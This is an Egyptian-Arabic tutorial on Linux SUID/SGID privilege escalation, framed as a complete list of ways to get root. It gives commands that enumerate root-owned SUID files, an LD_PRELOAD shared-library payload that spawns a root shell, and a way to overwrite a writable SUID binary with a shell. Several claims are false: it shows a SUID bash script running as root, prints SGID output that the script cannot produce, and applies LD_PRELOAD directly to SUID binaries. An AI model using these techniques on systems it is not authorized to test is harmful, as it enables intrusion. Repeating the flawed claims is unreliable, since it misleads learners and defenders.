## 🔥 **SUID / SGID - فهم أعمق مع استغلال عملي**

هنغطي هنا:  
✅ **إزاي SUID و SGID بيشتغلوا فعليًا؟**  
✅ **طرق البحث عنهم في النظام باستخدام أوامر عملية**  
✅ **كل الطرق اللي تقدر تستغل بيها ملفات SUID و SGID**  
✅ **تشغيل أكواد استغلال فعلية لرفع الصلاحيات**

---

## 🛠 **1. SUID و SGID - شرح عملي مع تجارب**

### 📌 **SUID (Set User ID) - يعني إيه عمليًا؟**

لما يكون `SUID` متفعّل على ملف تنفيذي، فمعناه إن أي حد يشغّله **هيتنفذ بصلاحيات مالك الملف بدل من صلاحيات المستخدم العادي**.

#### 🔥 **تجربة عملية - إنشاء ملف SUID**

هنعمل ملف بسيط ونشوف الفرق قبل وبعد إضافة `SUID`:

```bash
# إنشاء ملف تنفيذي بسيط
echo -e '#!/bin/bash\necho "User: $(whoami)"' > suid_test.sh
chmod +x suid_test.sh

# تشغيله كمستخدم عادي
./suid_test.sh
```

**المخرجات هتكون:**

```bash
User: user  # بيتنفذ بصلاحيات المستخدم العادي
```

#### ✅ **إضافة SUID**

هنغيّر ملكية الملف ونضيف `SUID`:

```bash
sudo chown root:root suid_test.sh
sudo chmod u+s suid_test.sh
ls -l suid_test.sh
```

**المخرجات:**

```bash
-rwsr-xr-x 1 root root 20 Mar 24 00:00 suid_test.sh
```

لاحظ الحرف `s` في التصاريح (`rwsr-xr-x`)، ده معناه إن `SUID` مفعّل.

#### 🚀 **تشغيله بعد إضافة SUID**

```bash
./suid_test.sh
```

**المخرجات هتكون:**

```bash
User: root  # رغم إننا مشغلينه بمستخدم عادي، اشتغل بصلاحيات root!
```

### 🔥 **SGID (Set Group ID) - يعني إيه عمليًا؟**

نفس فكرة `SUID`، لكن بدل ما الملف يتنفذ بصلاحيات مالك الملف، بيتنفذ بصلاحيات **المجموعة المالكة للملف**.

#### ✅ **إضافة SGID على ملف**

```bash
sudo chown root:staff suid_test.sh
sudo chmod g+s suid_test.sh
ls -l suid_test.sh
```

**المخرجات:**

```bash
-rwxr-sr-x 1 root staff 20 Mar 24 00:00 suid_test.sh
```

الحرف `s` في `rwxr-sr-x` معناه إن `SGID` مفعّل.

#### 🚀 **تشغيله بعد إضافة SGID**

```bash
./suid_test.sh
```

**المخرجات:**

```bash
Group: staff  # الملف اتنفذ بصلاحيات المجموعة staff
```

---

### 🟢 **💡 الخلاصة (بالمصري)**

- `SUID` بيخلي أي ملف تنفيذي يشتغل بصلاحيات **صاحب الملف** مش المستخدم اللي شغّله.
- `SGID` بيخلي أي ملف يشتغل بصلاحيات **المجموعة المالكة** للملف.
- لو لقيت ملف عنده `SUID` ومتملّك لـ `root`، تقدر تحاول تستغله عشان تاخد صلاحيات `root`.

---

## 🔎 **2. البحث عن ملفات SUID و SGID في النظام**

### ✅ **البحث عن كل ملفات SUID في النظام**

```bash
find / -type f -perm -u+s 2>/dev/null
```

**دي بتدور على كل الملفات اللي عندها `SUID` مفعّل.**

### ✅ **البحث عن كل ملفات SGID في النظام**

```bash
find / -type f -perm -g+s 2>/dev/null
```

**دي بتدور على كل الملفات اللي عندها `SGID` مفعّل.**

### ✅ **البحث عن ملفات SUID أو SGID مع تفاصيل التصاريح**

```bash
find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

**هيعرض كل الملفات مع التصاريح بتاعتها عشان تشوف بسهولة إيه اللي ممكن يكون قابل للاستغلال.**

### ✅ **البحث عن ملفات SUID/SGID لمستخدم معين (مثلاً root)**

```bash
find / -user root -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

**دي بتدور على أي ملف SUID أو SGID مملوك لـ `root`.**

---

### 🟢 **💡 الخلاصة (بالمصري)**

- استخدم `find` عشان تدور على الملفات اللي ممكن تستغلها.
- ركّز على الملفات اللي مملوكة لـ `root`، لأنها ممكن تديك صلاحيات `root`.
- دايمًا شوف التصاريح بتاعت الملفات (`ls -l`) عشان تتأكد إنها قابلة للاستغلال.

---

## 🚀 **3. كل الطرق الممكنة لاستغلال ملفات SUID**

لو لقيت ملف `SUID` مملوك لـ `root`، عندك كذا طريقة للاستغلال:

### 🔥 **1. تشغيل شيل مباشرة**

لو الملف بيديك **شيل (`shell`) تفاعلي**، ممكن تعمل الآتي:

```bash
/path/to/suid_binary
whoami
```

لو `whoami` رجّع `root`، يبقى الاختراق ناجح.

### 🔥 **2. تشغيل أمر معين بصلاحيات `root`**

بعض ملفات `SUID` بتسمح لك تنفّذ أوامر:

```bash
/path/to/suid_binary -c "id"
```

**لو الأمر اتنفذ بصلاحيات `root`، يبقى فيه استغلال.**

### 🔥 **3. تعديل متغيرات البيئة (`LD_PRELOAD`)**

لو الملف بيستخدم مكتبة ديناميكية، ممكن نحط مكتبة احنا عاملينها ونحصل على `root`:

```bash
echo -e '#include <stdio.h>\n#include <stdlib.h>\nvoid _init() { setgid(0); setuid(0); system("/bin/sh"); }' > exploit.c
gcc -shared -o exploit.so -fPIC exploit.c
LD_PRELOAD=./exploit.so /path/to/suid_binary
```

ده هيشغّل `shell` بصلاحيات `root`.

### 🔥 **4. استغلال الملفات القابلة للكتابة**

لو الملف عنده `SUID` **لكنه قابل للتعديل (`writable`)**، ممكن تعدّل عليه وتضيف كود تشغيل `sh`.

```bash
echo -e '#!/bin/bash\n/bin/bash' > /path/to/suid_binary
chmod +x /path/to/suid_binary
/path/to/suid_binary
```

---

### 🟢 **💡 الخلاصة (بالمصري)**

- جرب تشغل الملف وتشوف صلاحياتك (`whoami`).
- لو بيقبل أوامر، جرب `id` أو `bash`.
- استخدم **`LD_PRELOAD`** لو الملف بيستخدم مكتبات ديناميكية.
- لو الملف قابل للكتابة، عدّله وخليه يفتح `sh`.

🔥 **كده عندك كل الطرق الممكنة لاستغلال SUID و SGID ورفع الصلاحيات!**